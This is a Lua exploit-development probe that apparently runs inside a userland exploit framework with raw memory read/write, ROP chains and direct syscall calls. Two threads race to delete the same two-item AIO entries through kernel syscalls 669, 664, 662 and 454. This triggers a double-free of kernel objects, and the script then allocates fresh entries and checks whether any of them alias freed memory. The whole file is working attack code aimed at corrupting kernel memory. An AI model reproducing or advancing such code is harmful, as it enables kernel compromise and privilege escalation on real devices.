-- CRASH_CLASS: HIGH
-- PROBE 673a: both chains delete a 2-item entry, and 641a showed both report 0
-- on 49 of 64 items. When both read the entry count as 1, both take the single
-- path and free S, D, P and T twice. This probe then creates fresh 2-item
-- entries and deletes their items one at a time, looking for two entries that
-- behave as one object (shared S: deleting one item changes the other entry).
print("=== PROBE 673a: AIO DOUBLE-FREE ALIAS DETECTION ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NB=16
local data=memory.alloc(0x1000)
local out=memory.alloc(0x40)
for i=0,0xFFC,4 do wd(N(data)+i,0) end
local sc669,sc664,sc662,sc454=mk(669),mk(664),mk(662),mk(454)
local function mkblock()
    wd(N(out),0)
    local o,r=pcall(function() return sc669(U(0x1001),U(N(data)),U(2),U(1),U(N(out)),U(0)) end)
    if o and N(r)==0 then return rd(N(out)) or 0 end
    return 0
end
local ids=memory.alloc(NB*2*4)
local made=0
for b=0,NB-1 do
    local base=mkblock()
    if base==0 then break end
    wd(N(ids)+(2*b)*4, base); wd(N(ids)+(2*b+1)*4, base+0x10000)
    made=made+1
end
print(string.format("[A] blocks=%d",made))
if made<4 then return end
local NI=made*2
local chk=memory.alloc(0x40)
local function poll(i,st)
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(ids)+i*4),U(1),U(N(chk)),U(0),U(0),U(0)) end)
    return rd(N(chk))
end
local good=0
for i=0,NI-1 do local s=poll(i); if s==3 or s==0x10003 then good=good+1 end end
print(string.format("[B] polled=%d/%d",good,NI))
if good<NI then return end
local W=memory.alloc(8); wd(N(W),0)
local stA=memory.alloc(NI*4); local stB=memory.alloc(NI*4)
for i=0,NI*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end
local function build(stp)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(454),U(N(W)),U(2),U(0))
    for i=0,NI-1 do c:push_syscall_with_ret(mk(662),U(N(ids)+i*4),U(1),U(N(stp)+i*4)) end
    return c
end
local ta=thread:new(build(N(stA))); local tb=thread:new(build(N(stB)))
ta:run(true); tb:run(true)
for i=1,600000 do local x=i end
wd(N(W),1)
pcall(function() sc454(U(N(W)),U(3),U(0x7fffffff)) end)
ta:join(); tb:join()
local both=0
for i=0,NI-1 do if rd(N(stA)+i*4)==0 and rd(N(stB)+i*4)==0 then both=both+1 end end
print(string.format("[C] both-zero items=%d of %d",both,NI))
-- now allocate fresh 2-item entries and watch for shared behaviour
local fresh={}
local fn=0
for k=1,12 do
    local b=mkblock()
    if b==0 then break end
    fn=fn+1; fresh[fn]={b,b+0x10000}
end
print(string.format("[D] fresh blocks=%d",fn))
if fn<2 then return end
local states={}
for k=1,fn do
    for j=1,2 do
        wd(N(chk),0x77777777)
        pcall(function() sc664(U(fresh[k][j]),U(1),U(N(chk)),U(0),U(0),U(0)) end)
        states[k*2+j]=rd(N(chk))
    end
end
local ready=0
for k=1,fn do if states[k*2+1]==3 and states[k*2+2]==3 then ready=ready+1 end end
print(string.format("[E] fresh blocks ready=%d of %d",ready,fn))
local anom=0
for k=1,fn do
    for j=1,2 do
        wd(N(chk),0x77777777)
        pcall(function() sc662(U(fresh[k][j]),U(1),U(N(chk))) end)
        local s=rd(N(chk))
        if s~=0 then anom=anom+1; if anom<=8 then print(string.format("[F] block %d item %d status %s",k,j,tostring(s))) end end
        -- the sibling must still read its own state
        local sj=(j==1) and 2 or 1
        local sv=states[k*2+sj]
        if sv~=3 and sv~=0x10003 then print(string.format("[!] block %d sibling pre-state %s",k,tostring(sv))) end
    end
end
print(string.format("[G] anomalies=%d",anom))
local c1=mkblock()
print(string.format("[H] canary create=%s",c1~=0 and "ok" or "fail"))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
